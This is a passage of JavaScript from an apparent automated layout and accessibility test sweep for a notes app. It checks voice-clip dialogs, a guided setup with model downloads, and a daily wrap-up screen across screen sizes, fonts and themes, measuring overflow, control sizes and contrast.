    out.numbers.themeToggle = `${toLight} → ${toDark}`; if (toLight !== 'sage/false' || toDark !== 'obsidian/true') iss('light/dark button', out.numbers.themeToggle);
    out.numbers.textSize = {}; for (const [ts] of TEXT_SIZES) { set({ textsize: ts }); out.numbers.textSize[ts] = getComputedStyle(app).getPropertyValue('--fs-md').trim() + ' → ' + parseFloat(getComputedStyle(app.querySelector('.doc')).fontSize) + 'px note text'; } set({ textsize: 'm' }); }
  /* ---- Build A: clips in notes, the recording pill, the question, the check, the Attachments tab, the brain dump, the save paths ---- */
  out.numbers.buildA = { clips: {}, pill: {}, ask: {}, tabs: {}, flows: {} };
  const bigIcons = key => app.querySelectorAll('.vpill svg, .vask svg, .clip svg, .att-panel svg, .att-embed svg, .modal[data-size="wide"] svg').forEach(s => { if (s.getBoundingClientRect().width > 24.5) iss('Build A icon over 24px', `${key} ${Math.round(s.getBoundingClientRect().width)}px`); });
  const voiceOff = () => { voiceClosed(); S.modal = null; };
  for (const sc of Object.keys(SCREENS)) for (const sample of ['typical', 'stress']) {
    const k = `${sc}/${sample}`;
    voiceOff(); set({ screen: sc, sample, view: 'notes', side: true, inspector: 'shown', widgets: 'none', zen: 'off', modal: null }); S.tab = 'outline'; renderAll();
    const doc = app.querySelector('.doc'), clips = [...doc.querySelectorAll('.clip')], n = note();
    const md = NVMarkdown.htmlToMd(typedLinks(doc, n.html)), embeds = noteEmbeds(n), tr = doc.querySelectorAll('[data-act="clip-transcribe"]').length;
    out.numbers.buildA.clips[k] = `${clips.length} clips · ${doc.querySelectorAll('.att-embed').length} file rows · ${tr} Transcribe · widths ${clips.map(c => Math.round(c.offsetWidth)).join('/')}`;
    if (clips.length !== 2 || tr !== 1 || doc.querySelectorAll('.att-embed').length !== 1) iss('Build A clips in the note', `${k}: ${out.numbers.buildA.clips[k]}`);
    if ([...doc.querySelectorAll('.att-src')].some(p => p.offsetParent)) iss('Build A embed line shown', k);
    if (embeds.some(f => !md.includes(`![[${f}]]`)) || /0:00 \/|Transcribe|1×/.test(md)) iss('Build A player leaks into the .md', `${k}: ${md.slice(-200)}`);
    clips.forEach(c => { if (px(c).r > px(doc).r + .5 || c.scrollWidth > c.clientWidth + 1) iss('Build A clip wider than the note', k); });
    measure(`buildA/note/${k}`); bigIcons(k);
    set({ modal: 'dump' }); inside('.dump', `${k}/dump`); measure(`buildA/dump/${k}`); if ((sample === 'typical' && !app.querySelector('.dump .clip')) || !app.querySelector('.dump [data-act="dump-voice"]')) iss('Build A voice thought or mic missing in the brain dump', k);   // stress: the thought is below the six shown
    for (const live of ['on', 'off']) for (const paused of [false, true]) {
      VA.cfg.live = live; set({ modal: voiceDemoA('recording', { paused }) });
      const p = app.querySelector('.vpill'), sb = app.querySelector('.status-bar'), key = `${k}/${live}/${paused ? 'paused' : 'recording'}`;
      if (!p) { iss('Build A pill missing', key); continue; }
      const btns = [...p.querySelectorAll('button')].map(b => Math.round(b.getBoundingClientRect().height));
      if (sample === 'typical') out.numbers.buildA.pill[key] = `${p.classList.contains('vpill--caption') ? 'live words' : 'compact'} ${Math.round(p.offsetWidth)}×${Math.round(p.offsetHeight)} · buttons ${[...new Set(btns)]}`;
      if (p.classList.contains('vpill--caption') !== (live === 'on') || app.querySelector('.modal-backdrop') || p.offsetHeight !== 36 || btns.some(h => h !== 28)) iss('Build A pill', `${key}: ${out.numbers.buildA.pill[key] || p.className}`);
      if (px(p).b > px(sb).t) iss('Build A pill over the status bar', key);
      inside('.vpill', key); measure(`buildA/pill/${key}`); bigIcons(key);
    }
    VA.cfg.live = 'auto';
    for (const keep of ['both', 'text', 'audio']) for (const dest of ['dump', 'note', 'new']) {
      set({ modal: voiceDemoA('ask', { keep, dest }) }); const m = app.querySelector('.vask'), key = `${k}/${keep}/${dest}`;
      if (!m) { iss('Build A question missing', key); continue; }
      inside('.modal', key); measure(`buildA/ask/${key}`); bigIcons(key);
      const mb = m.querySelector('.modal-body'); if (mb.scrollWidth > mb.clientWidth + 1) iss('Build A question scrolls sideways', key);
      if (!!m.querySelector('[data-act="voice-next"]') !== (keep !== 'audio') || !m.querySelector('.clip-take') || m.querySelectorAll('.seg-opt[aria-pressed="true"]').length !== 2) iss('Build A question controls', key);
      if (keep === 'both' && dest === 'dump') out.numbers.buildA.ask[k] = `${Math.round(m.offsetWidth)}×${Math.round(m.offsetHeight)} · foot ${[...m.querySelectorAll('.modal-foot .btn')].map(b => Math.round(b.offsetHeight))}`;
    }
    for (const raw of [false, true]) { set({ modal: voiceDemoA('check', { keep: 'both', raw }) }); const m = app.querySelector('.modal[data-size="wide"]'), key = `${k}/check/${raw ? 'raw' : 'clean'}`;
      if (!m || m.querySelectorAll('[data-act="voice-text"]').length !== 2 || !m.querySelector('.clip-take') || !m.querySelector(`.voice-pane.is-chosen ${raw ? '.voice-text' : 'h3'}`)) iss('Build A check dialog', key);
      inside('.modal', key); measure(`buildA/${key}`); }
    voiceOff();
  }
  // The Attachments tab: four tabs that never move or go bold, in every font; the note's files; the tab with no note open
  for (const sc of Object.keys(SCREENS)) for (const [font] of FONTS) {
    set({ screen: sc, view: 'notes', sample: 'typical', inspector: 'shown', font, modal: null }); S.attOpen = null;
    const rects = [], weights = new Set();
    for (const k of ['outline', 'backlinks', 'tags', 'files']) { S.tab = k; renderAll(); const tabs = [...app.querySelectorAll('#right-sidebar .tab')];
      rects.push(tabs.map(t => { const r = px(t); return [r.l, r.r].map(half).join(','); }).join(' ')); tabs.forEach(t => weights.add(getComputedStyle(t).fontWeight)); }
    const tabs = [...app.querySelectorAll('#right-sidebar .tab')], row = app.querySelector('#right-sidebar .tab-track');
    const clipped = tabs.filter(t => { const l = t.querySelector('.tab-label'); return l && l.scrollWidth > t.clientWidth - 2 * parseFloat(getComputedStyle(t).paddingLeft) + .5; }).map(t => t.dataset.v);
    const fills = Math.abs(px(tabs[tabs.length - 1]).r - px(row).r) < 1 && Math.abs(px(tabs[0]).l - px(row).l) < 1;
    out.numbers.buildA.tabs[`${sc}/${font}`] = `${tabs.length} tabs · widths ${tabs.map(t => Math.round(t.offsetWidth)).join('/')} · clipped ${clipped.join('/') || 'none'} · fills ${fills}`;
    if (tabs.length !== 5 || clipped.length || !fills || new Set(rects).size > 1 || weights.size > 1) iss('Build A four tabs',   /* Build DV (QC 114): and Documents, the fifth */ `${sc}/${font}: ${out.numbers.buildA.tabs[`${sc}/${font}`]} · moves ${new Set(rects).size > 1}`);
    const panel = app.querySelector('.att-panel'); if (!panel || panel.querySelectorAll('.att-row').length !== 3) iss('Build A Attachments tab rows', `${sc}/${font}`);
    S.attOpen = noteEmbeds(note())[0]; renderAll(); out.combos++; inside('#right-sidebar .att-detail', `${sc}/${font}`); measure(`buildA/tab/${sc}/${font}`);
    if (!app.querySelector('.att-detail .clip') || !app.querySelector('.att-detail [data-act="att-remove"]')) iss('Build A attachment detail', `${sc}/${font}`);
    app.querySelectorAll('#right-sidebar .att-row').forEach(r => { if (px(r).r > px(app.querySelector('#right-sidebar')).r + .5) iss('Build A row past the sidebar', `${sc}/${font}`); });
    S.attOpen = null;
  }
  set({ font: 'opendyslexic', sample: 'empty' }); { S.tab = 'files'; renderAll(); out.combos++;   // parity round (R51 r45-attnote): the setting is gone; no note, no Attachments tab
    const n = app.querySelectorAll('#right-sidebar .tab').length;
    if (n !== 4) iss('Build A no Attachments tab with no note open', `${n} tabs`); }   // Build DV (QC 114): Outline, Backlinks, Tags and Documents
  VA.cfg.empty = 'message'; S.tab = 'outline';
  // Every save path, without the app: 3 Keeps × 3 places, then Transcribe and Remove
  for (const keep of ['both', 'text', 'audio']) for (const dest of ['dump', 'note', 'new']) {
    voiceOff(); set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); const n0 = note(), md0 = n0.md, notes0 = D.notes.length, inbox0 = D.inbox.length, tasks0 = D.tasks.length;
    S.modal = voiceDemoA('ask', { keep, dest }); renderAll(); await acceptV2();
    const it = D.inbox[D.inbox.length - 1], nn = dest === 'new' ? D.notes[0] : n0, audio = keep !== 'text', text = keep !== 'audio';
    let ok, got;
    if (dest === 'dump') { got = `inbox +${D.inbox.length - inbox0} · clip ${!!it.audio} · text ${!!it.text} · ${it.taskIds?.length || 0} board tasks · tasks +${D.tasks.length - tasks0} · line ${!!app.querySelector('.dump .dump-item')?.querySelector('[data-act="voice-tasks-open"]')}`;   // Build A+: ticked tasks go to the board
      ok = D.inbox.length === inbox0 + 1 && !!it.audio === audio && !!it.text === text && !it.tasks?.length && (it.taskIds?.length || 0) === (text ? 3 : 0) && D.tasks.length - tasks0 === (text ? 3 : 0)
        && it.taskIds.every(id => D.tasks.some(t => t.id === id && !t.noteId && t.due === 'Upcoming')) && !!app.querySelector('.dump .dump-item')?.querySelector('[data-act="voice-tasks-open"]') === text && S.modal === 'dump'; }
    else { const md = dest === 'new' ? nn.md : nn.md.slice(md0.length); got = `notes +${D.notes.length - notes0} · embed ${/!\[\[attachments\/voice-/.test(md)} · text ${/design sync/.test(md)} · tasks +${D.tasks.length - tasks0}`;
      ok = D.notes.length === notes0 + (dest === 'new' ? 1 : 0) && /!\[\[attachments\/voice-/.test(md) === audio && /design sync/.test(md) === text && D.tasks.length - tasks0 === (text ? 3 : 0) && S.voice.stage === 'idle'; }
    out.numbers.buildA.flows[`${keep}/${dest}`] = got; if (!ok) iss('Build A save path', `${keep}/${dest}: ${got}`);
  }
  { voiceOff(); set({ sample: 'typical', modal: null }); const n = note(), f = noteEmbeds(n)[1]; transcribeClip(f, n.id); const opened = S.modal === 'voice' && S.voice.stage === 'check' && !!app.querySelector('.modal[data-size="wide"] .clip');
    await acceptV2(); const under = n.md.split('\n').slice(n.md.split('\n').findIndex(l => l.trim() === `![[${f}]]`) + 1).find(l => l.trim()) || '';
    out.numbers.buildA.flows.transcribe = `check opened ${opened} · under the clip: ${under.slice(0, 40)}`; if (!opened || !/design sync/.test(under)) iss('Build A Transcribe', out.numbers.buildA.flows.transcribe);
    const it = D.inbox.find(x => x.audio), a0 = D.atts.length; S.attDel = it.audio; await removeAtt(it.audio);
    out.numbers.buildA.flows.remove = `files ${a0} → ${D.atts.length} · thought kept with its text ${!!D.inbox.find(x => x.id === it.id && !x.audio && x.text)}`; if (D.atts.length !== a0 - 1 || !D.inbox.find(x => x.id === it.id && !x.audio)) iss('Build A Remove', out.numbers.buildA.flows.remove);
    const f0 = noteEmbeds(n)[0]; S.attDel = f0; await removeAtt(f0); if (n.md.includes(`![[${f0}]]`)) iss('Build A Remove left the embed', f0); }
  voiceOff(); stopPlayer();
  /* ---- Build D: the guided setup (R24) — 6 steps × 2 sample PCs (a roomy one with a graphics card, and R23's small one) × every screen:
          nothing cut off or sideways, each step starts at its top, one current step, controls on 24/28/32/36; then its flows ---- */
  out.numbers.setup = { steps: {}, flows: {}, themes: {} };
  const keepSave = saveSettings; saveSettings = () => {};   // nothing the sweep clicks is saved
  const obEl = () => app.querySelector('.onboard'), obCard = () => app.querySelector('.onboard-card');
  const obH = el => [...new Set([...el.querySelectorAll('.btn, .field, .seg')].filter(b => b.offsetParent).map(b => b.offsetHeight))].sort((a, b) => a - b);
  const obOpen = (pcs, step, again = false) => { aiDemo(pcs); SETUP.info = null; VA.cfg.live = 'auto'; SETUP.open = false; openSetup(again); if (step !== 'vault') { SETUP.reached = 5; obGo(step); } out.combos++; };
  for (const sc of Object.keys(SCREENS)) for (const pcs of ['none', 'lowdisk']) for (const [step] of OB_STEPS) {
    set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); obOpen(pcs, step);
    const k = `${sc}/${pcs}/${step}`, ob = obEl(), card = obCard();
    if (!card) { iss('setup step missing', k); continue; }
    measure(`setup/${k}`);
    if (ob.scrollTop !== 0) iss('setup step does not start at its top', `${k}: ${ob.scrollTop}px`);
    if (card.getBoundingClientRect().top - ob.getBoundingClientRect().top < -1) iss('setup step top cut off', k);
    if (card.scrollWidth > card.clientWidth + 1 || ob.scrollWidth > ob.clientWidth + 1) iss('setup step scrolls sideways', k);
    const r = ob.getBoundingClientRect(), a = app.getBoundingClientRect(); if (r.left < a.left - 1 || r.right > a.right + 1 || r.bottom > a.bottom + 1) iss('setup outside the window', k);
    const hs = obH(card); if (hs.some(h => ![24, 28, 32, 36].includes(h))) iss('setup control off the scale', `${k}: ${hs}`);
    if (app.querySelectorAll('.ob-step[aria-current="step"]').length !== 1 || !app.querySelector(`.ob-step.is-current[data-v="${step}"]`)) iss('setup stepper', k);
    const cut = [...card.querySelectorAll('.truncate, .ob-model .set-label, .seg-opt, .btn, .ob-step')].filter(el => el.offsetWidth && el.scrollWidth > el.clientWidth + 1).map(el => el.textContent.trim().slice(0, 30));
    if (cut.length) iss('setup label cut', `${k}: ${cut.slice(0, 3).join(' / ')}`);
    const shown = [...app.querySelectorAll('.titlebar [data-act]')].filter(b => getComputedStyle(b).visibility !== 'hidden').map(b => b.dataset.act);
    if (shown.some(x => x !== 'win')) iss('setup: window bar controls other than the window buttons', `${k}: ${shown}`);
    if (step === 'comfort' && (app.querySelectorAll('.ob-swatches .swatch').length !== 9 || app.querySelectorAll('.onboard .font-opt').length !== 4 || getComputedStyle(card.querySelector('.ob-swatches')).gridTemplateColumns.split(' ').length !== 3)) iss('setup Reading: 9 swatches in 3 columns and the 4 built-in fonts', k);
    if (step === 'voice') { const lw = card.querySelector('[data-act="ob-live"]'), want = pcs !== 'lowdisk';
      if (lw?.getAttribute('aria-checked') !== String(want) || (!want && !/Off to save space/.test(lw.closest('.set-row').textContent))) iss('setup live words default', `${k}: ${lw?.getAttribute('aria-checked')}`); }
    if (step === 'ai') { const off = card.querySelectorAll('.ob-model:disabled'); if (off.length !== (pcs === 'lowdisk' ? 2 : 0) || [...off].some(b => !b.title)) iss('setup AI: models that do not fit', `${k}: ${off.length}`); }
    if (step === 'done') { const tot = card.querySelector('.ob-total')?.textContent || '';
      if (/Live words model/.test(tot) !== (pcs !== 'lowdisk') || !/huggingface\.co/.test(tot) || !/keeps [\d.]+ GB free/.test(tot)) iss('setup Ready: the download list', `${k}: ${tot.slice(0, 140)}`); }
    if (sc === '1920x1080' || sc === '1366x768') out.numbers.setup.steps[k] = `card ${card.offsetHeight} of ${ob.clientHeight}px${ob.scrollHeight > ob.clientHeight + 1 ? ' · scrolls' : ''} · controls ${hs.join('/')}`;
  }
  { // flows, at 1366 × 768 on the roomy PC
    set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null }); obOpen('none', 'ai');
    const F = out.numbers.setup.flows; let ob = obEl(); ob.scrollTop = 9999; const deep = ob.scrollTop;
    app.querySelector('.ob-model:not(:disabled):not([aria-pressed="true"])').click(); F.click = `scrolled ${deep}px, a click on a model: ${obEl().scrollTop}px`;
    if (!deep || obEl().scrollTop !== deep) iss('setup: a click moved the scrolled step', F.click);
    app.querySelector('#ob-next').click(); F.next = `Next from the bottom of AI: Ready at ${obEl().scrollTop}px, focus on "${document.activeElement?.textContent}"`;
    if (obEl().scrollTop !== 0 || S.ob.step !== 'done' || document.activeElement?.id !== 'ob-t') iss('setup: the next step does not start at its top', F.next);
    const t0 = READER.theme; obGo('comfort'); app.querySelector('.ob-swatches [data-v="sepia"]').click(); const mid = READER.theme; app.querySelector('[data-act="ob-skip"]').click();
    F.skip = `Reading: ${t0} → ${mid} → Skip → ${READER.theme}, now on ${S.ob.step}`; if (mid !== 'sepia' || READER.theme !== t0 || S.ob.step !== 'focus') iss('setup: Skip puts the step back', F.skip);
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); app.dispatchEvent(new KeyboardEvent('keydown', { key: 'k', ctrlKey: true, bubbles: true }));
    F.keys = `Esc and Ctrl+K: setup ${SETUP.open ? 'still open' : 'closed'}, dialog ${S.modal}`; if (!SETUP.open || S.modal) iss('setup: Esc or a shortcut left the setup', F.keys);
    obGo('voice'); app.querySelector('[data-act="ob-set"][data-k="stt"][data-v="none"]').click(); const lw = app.querySelector('[data-act="ob-live"]'); obGo('done');
    F.noStt = `speech to text "Not now": live words ${lw.disabled ? 'disabled' : 'on'}; to download ${obDownloads().map(x => x.key).join(', ')}`; if (!lw.disabled || obDownloads().some(x => x.key === 'stt' || x.key === 'live')) iss('setup: no speech to text still downloads', F.noStt);
    // Build N (R56): In the cloud is built: the companies as choices (Groq first), the picked one's facts, links and three steps
    obGo('ai'); { const how = app.querySelector('[data-k="how"][data-v="cloud"]'); how?.click(); const d = app.querySelector('.cl-ob'), picks = [...(d?.querySelectorAll('[data-act="cl-obpick"]') || [])];
      F.cloud = `soon ${how?.hasAttribute('data-soon')} · ${picks.length} companies, pressed ${picks.find(b => b.getAttribute('aria-pressed') === 'true')?.dataset.v} · facts ${d?.querySelectorAll('.cl-fact').length} · links ${d?.querySelectorAll('.cl-links .cl-link').length} · steps ${d?.querySelectorAll('.cl-steps > li').length} · "${d?.querySelector('[data-act="cl-save"]')?.textContent}"`;
      if (!how || how.hasAttribute('data-soon') || picks.length !== 8 || picks[0].dataset.v !== 'groq' || picks[0].getAttribute('aria-pressed') !== 'true' || d.querySelectorAll('.cl-fact').length !== 3 || d.querySelectorAll('.cl-links .cl-link').length !== 2 || d.querySelectorAll('.cl-steps > li').length !== 3 || !d.querySelector('[data-act="cl-save"]')) iss('setup: In the cloud, with the companies and the three steps', F.cloud);
      picks[1]?.click(); const g = app.querySelector('.cl-obdetail')?.dataset.clOb; obGo('done'); F.cloudReady = `picked ${g} · Ready: "${[...app.querySelectorAll('.ob-sum')].find(x => /^AI/.test(x.textContent))?.querySelector('.set-desc')?.textContent}"`;
      if (g !== 'gemini' || !/In the cloud · no key yet/.test(F.cloudReady)) iss('setup: the picked company, and Ready says it', F.cloudReady); obGo('ai'); }
    app.querySelector('[data-act="ob-set"][data-k="how"][data-v="none"]').click(); obGo('done'); F.noAi = `No AI for now: ${obDownloads().length} files to download`;
    if (obDownloads().length || !/Off for now/.test(app.querySelector('.onboard').textContent)) iss('setup: No AI still downloads', F.noAi);
    obGo('vault'); const foot1 = [...app.querySelectorAll('.ob-foot .btn')].map(b => b.textContent.trim()); F.first = `step 1's buttons: ${foot1.join(' · ')}`; if (foot1.join('|') !== 'Skip the setup|Next') iss('setup: step 1 foot', F.first);
    app.querySelector('[data-act="ob-skip-all"]').click(); F.skipAll = `Skip the setup: ${SETUP.open ? 'still open' : 'closed'}, window bar back ${!app.classList.contains('is-setup')}`; if (SETUP.open || app.classList.contains('is-setup')) iss('setup: Skip the setup', F.skipAll);
    openSettings('data'); const again = app.querySelector('.settings-pane [data-act="setup-again"]'); again?.click();
    F.again = `Settings → Data → ${again?.textContent}: ${SETUP.open ? 'open' : 'closed'}, ${app.querySelectorAll('.ob-step:not(:disabled)').length} steps open, "${app.querySelector('[data-act="ob-skip-all"]')?.textContent}"`;
    if (!again || !SETUP.open || !SETUP.again || !/Close the setup/.test(F.again)) iss('setup: Run the setup again', F.again);
    obGo('done'); if (!/Start the downloads|Done/.test(app.querySelector('#ob-start').textContent)) iss('setup again: Start label', app.querySelector('#ob-start').textContent);
    closeSetup();
    // the downloads after Start: the status bar's link and its dialog
    SETUP.dl = { items: [{ key: 'stt', label: 'Whisper base.en (speech to text)', state: 'downloading', done: 8e7, total: 1.6e8, message: '' }, { key: 'live', label: 'Live words model', state: 'queued', done: 0, total: 4.4e7, message: '' },
      { key: 'tts', label: 'Kokoro (read aloud)', state: 'error', done: 0, total: 1.03e8, message: 'kokoro-int8-en-v0_19.tar.bz2 didn\'t download (timed out).' }, { key: 'qwen35-4b', label: 'Qwen3.5 4B (AI)', state: 'downloading', done: 1e9, total: 2.7e9, message: '' }] };
    for (const sc of Object.keys(SCREENS)) { S.dlPop = false; set({ screen: sc, modal: null }); const l = app.querySelector('.status-bar [data-act="setup-dl"]'), lbl = l?.querySelector('.status-label')?.textContent || '';
      if (!l || lbl.length > 'Ollama · local'.length) iss('setup downloads: status bar link', `${sc}: "${lbl}"`);
      l?.click(); const m = app.querySelector('.dl-pop'); measure(`setup-dl/${sc}`); inside('.dl-pop', `setup-dl/${sc}`);   // Build L: a list above its link, no dimmed window
      if (!m || m.querySelectorAll('.ob-dl').length !== 4 || !m.querySelector('[role="alert"]') || !m.querySelector('[data-act="setup-dl-cancel"]') || app.querySelector('.modal-backdrop')) iss('setup downloads list', sc);
      const hs = obH(m || app); if (hs.some(h => ![24, 28, 32, 36].includes(h))) iss('setup downloads dialog: control off the scale', `${sc}: ${hs}`);
      if (sc === '1366x768') F.downloads = `status bar "${lbl}" · dialog ${m?.offsetWidth}×${m?.offsetHeight}, ${m?.querySelectorAll('.ob-dl').length} rows`; }
    S.dlPop = false; SETUP.dl = { items: [{ key: 'qwen35-4b', label: 'Qwen3.5 4B (AI)', state: 'downloading', done: 1, total: 2, message: '' }] }; set({ modal: null });
    if (app.querySelector('[data-act="setup-dl"]')) iss('setup downloads: only the AI left should leave the status bar to Build B', '');
    SETUP.dl = null;
    // all nine themes: the setup's text on its card
    for (const [th] of THEMES) { set({ theme: th, screen: '1920x1080', modal: null }); obOpen('none', 'done'); const c = obCard(), bg = getComputedStyle(c).backgroundColor;
      const t = ratio(getComputedStyle(c.querySelector('#ob-t')).color, bg), d = ratio(getComputedStyle(c.querySelector('.ob-sum .set-desc')).color, bg), cur = ratio(getComputedStyle(app.querySelector('.ob-step.is-current')).color, getComputedStyle(app.querySelector('.ob-step.is-current')).backgroundColor);
      out.numbers.setup.themes[th] = `title ${t}:1 · text ${d}:1 · current step ${cur}:1`; if (Math.min(t, d, cur) < 4.5) iss('setup contrast under AA', `${th}: ${out.numbers.setup.themes[th]}`); closeSetup(); }
  }
  saveSettings = keepSave; AI.st = null; AI.demo = false; SETUP.info = null; SETUP.open = false; VA.cfg.live = 'auto'; S.ob.step = 'vault'; set({ modal: null, theme: keep.reader.theme });
  /* ---- end Build D ---- */
  /* ---- Build F: the wrap-up's three steps and the launchpad, on a busy day (typical, stress) and an empty one, on every
     screen: inside the window, no sideways scroll, controls on the 24/28/32/36 scale, icons no bigger than 18px, the memo's
     pill clear of the dialog's buttons; the nine themes' "today's win" row; then Finish and Launch on the sample ---- */
  out.numbers.buildF = { wrap: {}, launch: {}, themes: {}, flows: {} };
  const fCheck = (key, sel) => {
    const m = app.querySelector(sel); if (!m) { iss('Build F dialog missing', key); return null; }
    inside('.modal', key); measure(`buildF/${key}`);
    const mb = m.querySelector('.modal-body'); if (mb && mb.scrollWidth > mb.clientWidth + 1) iss('Build F dialog scrolls sideways', key);
    m.querySelectorAll('button, input:not([type="checkbox"]), select').forEach(el => { const h = Math.round(el.getBoundingClientRect().height); if (el.offsetWidth && ![24, 28, 32, 36].includes(h)) iss('Build F control off the 24/28/32/36 scale', `${key} ${h}px ${String(el.className).split(' ')[0] || el.tagName}`); });
    m.querySelectorAll('svg').forEach(s => { const w = s.getBoundingClientRect().width; if (w > 18.5) iss('Build F icon over 18px', `${key} ${Math.round(w)}px`); });
    return m;
  };
  for (const sc of Object.keys(SCREENS)) for (const sample of ['typical', 'stress', 'empty']) {
    const k = `${sc}/${sample}`, day = sample === 'empty' ? 'empty' : 'busy';
    for (const tstate of ['running', 'idle']) for (const [step, o] of [[1, {}], [1, { pick: true }], [2, {}], [2, { triage: true }], [3, {}], [3, { starters: true, note: 'The failing test is already open. Start there, roadmap after 11.', memo: true }], [3, { rec: true }]]) {
      const key = `${k}/${tstate}/step${step}${o.pick ? '/picked' : o.triage ? '/sorted' : o.starters ? '/filled' : o.rec ? '/recording' : ''}`;
      set({ screen: sc, sample, view: 'notes', side: true, inspector: 'shown', widgets: 'none', zen: 'off', tstate, modal: null }); S.modal = wrapDemo(step, o); renderAll(); out.combos++;
      const m = fCheck(key, '.wrap-modal'); if (!m) continue;
      const snooze = !!m.querySelector('[data-act="wrap-snooze"]'); if (snooze !== (tstate === 'running' && sample !== 'empty')) iss('Build F Snooze only while a timer runs', key);
      if (m.querySelectorAll('.step[aria-current="step"]').length !== 1 || m.querySelectorAll('.step.is-done').length !== step - 1) iss('Build F stepper', key);
      if (step === 1) { const rows = m.querySelectorAll('.win-pick').length;
        if (day === 'busy' ? !rows : rows || !/You still showed up/.test(m.textContent)) iss('Build F wins', `${key}: ${rows} rows`);
        if (o.pick && day === 'busy' && m.querySelectorAll('.win-pick[aria-pressed="true"] .chip').length !== 1) iss('Build F picked win', key);
        if (!m.querySelector('#wrap-win-text')) iss('Build F own-words win', key);
        if (tstate === 'running' && !o.pick) out.numbers.buildF.wrap[`${k}/1`] = `${rows} wins · ${[...m.querySelectorAll('.kpi-value')].map(x => x.textContent).join(' / ')}`; }
      if (step === 2) { const rows = m.querySelectorAll('.triage-row').length, n = triageItems().length;
        if (rows !== n || (day === 'empty') !== !!m.querySelector('.empty')) iss('Build F tidy rows', `${key}: ${rows} of ${n}`);
        if (o.triage && m.querySelectorAll('.triage-row .chip').length !== Object.keys(S.wrap.triage).length) iss('Build F tidy choices', key);
        m.querySelectorAll('.triage-row').forEach(r => { if (px(r).r > px(m.querySelector('.modal-body')).r + .5) iss('Build F tidy row too wide', key); });
        if (tstate === 'running' && !o.triage) out.numbers.buildF.wrap[`${k}/2`] = `${rows} loose ends`; }
      if (step === 3) { const boxes = [...m.querySelectorAll('[data-act="wrap-starter"]')], full = starterCount() >= 3;
        if (o.starters && !m.querySelector('.starter-typed')) iss('Build F typed starter', key);
        if (o.starters && day === 'busy' && (!full || boxes.some(b => !b.checked && !b.disabled) || !m.querySelector('#wrap-starter-input').disabled)) iss('Build F 3 starters cap', key);
        if (o.memo && !m.querySelector('.memo-row .clip')) iss('Build F memo clip', key);
        if (o.rec) { const p = app.querySelector('.vpill'), btn = [...m.querySelectorAll('.modal-foot .btn')]; if (!p) iss('Build F memo pill missing', key);
          else if (btn.some(b => px(b).b > px(p).t && px(b).t < px(p).b && px(b).r > px(p).l && px(b).l < px(p).r)) iss('Build F pill over the buttons', key);
          if (!m.querySelector('#wrap-next')?.disabled) iss('Build F Finish while recording', key); }
        if (day === 'empty' && !o.starters && !/Type one to start with/.test(m.textContent)) iss('Build F empty starters', key);
        if (tstate === 'running' && !o.starters && !o.rec) out.numbers.buildF.wrap[`${k}/3`] = `${boxes.length} open tasks · modal ${Math.round(m.offsetWidth)}×${Math.round(m.offsetHeight)}`; }
      memoReset();
    }
    set({ screen: sc, sample, view: 'notes', tstate: 'idle', modal: null }); WRAP.lp = lpFromSample(); S.modal = 'launch'; renderAll(); out.combos++;
    const lm = fCheck(`${k}/launch`, '.modal.launch');
    if (lm) { const go = lm.querySelector('#launch-go'), feet = [...new Set([...lm.querySelectorAll('.modal-foot .btn')].map(b => Math.round(b.offsetHeight)))];
      out.numbers.buildF.launch[k] = `note ${!!lm.querySelector('.launch-quote')} · memo ${!!lm.querySelector('.clip')} · first task ${!!lm.querySelector('.task-card-title')} · launch ${go.disabled ? 'off' : 'on'} · foot ${feet}`;
      if (feet.length !== 1 || feet[0] !== 32) iss("Build F launchpad footer off the dialog buttons' 32px (Build L, R41)", `${k}: ${feet}`);
      if (day === 'busy' ? go.disabled || !lm.querySelector('.launch-quote') || !lm.querySelector('.clip') : !go.disabled || lm.querySelector('.launch-quote')) iss('Build F launchpad content', `${k}: ${out.numbers.buildF.launch[k]}`); }
  }
  for (const [th] of THEMES) {   // the picked win and its chip, the tidy chips, the launchpad's quote, in every theme
    set({ screen: '1920x1080', sample: 'typical', theme: th, tstate: 'idle', modal: null }); S.modal = wrapDemo(1, { pick: true }); renderAll();
    const row = app.querySelector('.win-pick[aria-pressed="true"]'), chip = row?.querySelector('.chip');
    const rgba = c => { const m = String(c).match(/[\d.]+/g)?.map(Number) || [0, 0, 0, 0]; return [m[0] || 0, m[1] || 0, m[2] || 0, m.length > 3 ? m[3] : 1]; };
    const bgOf = el => { const layers = []; let base = null;   // the background as seen: translucent layers laid over the first solid one
      for (let e = el; e && !base; e = e.parentElement) { const c = rgba(getComputedStyle(e).backgroundColor); if (c[3] >= 1) base = c; else if (c[3] > 0) layers.push(c); }
      base ||= rgba(colorOf('--bg')); layers.reverse().forEach(([r, g, b, a]) => { base = [base[0] * (1 - a) + r * a, base[1] * (1 - a) + g * a, base[2] * (1 - a) + b * a, 1]; });
      return `rgb(${base.slice(0, 3).map(Math.round).join(', ')})`; };
    const c = { win: row ? ratio(getComputedStyle(row).color, bgOf(row)) : 0, winChip: chip ? ratio(getComputedStyle(chip).color, bgOf(chip)) : 0 };   // measured before the next render replaces them
    S.modal = wrapDemo(2, { triage: true }); renderAll(); c.tidyChips = Math.min(...[...app.querySelectorAll('.triage-row .chip')].map(x => ratio(getComputedStyle(x).color, bgOf(x))));
    WRAP.lp = lpFromSample(); S.modal = 'launch'; renderAll(); const q = app.querySelector('.launch-quote'); c.quote = q ? ratio(getComputedStyle(q).color, bgOf(q)) : 0;
    out.numbers.buildF.themes[th] = Object.entries(c).map(([a, b]) => `${a} ${b}`).join(' · ');
    Object.entries(c).forEach(([a, b]) => { if (b < 4.5) iss('Build F contrast under AA', `${th} ${a} ${b}`); });
  }
  set({ theme: keep.reader.theme || 'obsidian' });
  { // Finish on the sample: the tidy choices land, the bridge carries the note and starters; then Launch starts the timer on the first one
    set({ screen: '1920x1080', sample: 'typical', view: 'notes', tstate: 'idle', modal: null }); S.modal = wrapDemo(3, { triage: true, starters: true, note: 'Start with the parser bug.', memo: true }); renderAll();
    const sorted = Object.entries(S.wrap.triage), first = [...S.wrap.starters][0], tasks0 = D.tasks.length; await finishWrap();
    const t1 = sorted.find(([k]) => k.startsWith('task:')), tk = t1 && taskById(t1[0].slice(5));
